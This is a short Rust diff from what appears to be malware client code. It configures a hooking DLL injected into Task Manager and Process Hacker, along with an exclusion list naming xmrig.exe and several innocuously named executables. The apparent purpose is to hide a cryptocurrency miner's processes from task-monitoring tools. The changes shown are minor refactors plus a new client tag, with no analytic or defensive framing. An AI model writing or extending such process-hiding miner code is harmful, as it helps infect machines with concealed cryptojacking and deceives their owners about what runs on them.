@@ -8,16 +8,16 @@ pub fn log_directory() -> PathBuf {
 
 pub fn default_query_hook_exclusions() -> Vec<String> {
     vec![
-        s!("xmrig.exe").to_string(),
-        s!("WinHandler64.exe").to_string(),
-        s!("SharedDataPolicy.exe").to_string(),
-        s!("llvm86.exe").to_string(),
-        s!("WndSec.exe").to_string()
+        s!("xmrig.exe").to_owned(),
+        s!("WinHandler64.exe").to_owned(),
+        s!("SharedDataPolicy.exe").to_owned(),
+        s!("llvm86.exe").to_owned(),
+        s!("WndSec.exe").to_owned()
     ]
 }
 
 pub fn query_hook_processes() -> Vec<String> {
-    vec![s!("taskmgr.exe").to_string(), s!("processhacker.exe").to_string()]
+    vec![s!("taskmgr.exe").to_owned(), s!("processhacker.exe").to_owned()]
 }
 
 pub fn query_hook_exclusions_file_path() -> PathBuf {
@@ -25,8 +25,11 @@ pub fn query_hook_exclusions_file_path() -> PathBuf {
 }
 
 pub fn query_hook_dll_name() -> String {
-    s!("lib.dll").to_string()
+    s!("lib.dll").to_owned()
 }
 pub fn client_version() -> u64 {
     1
+}
+pub fn client_tag() -> String {
+    s!("temp-tag").to_owned()
 }
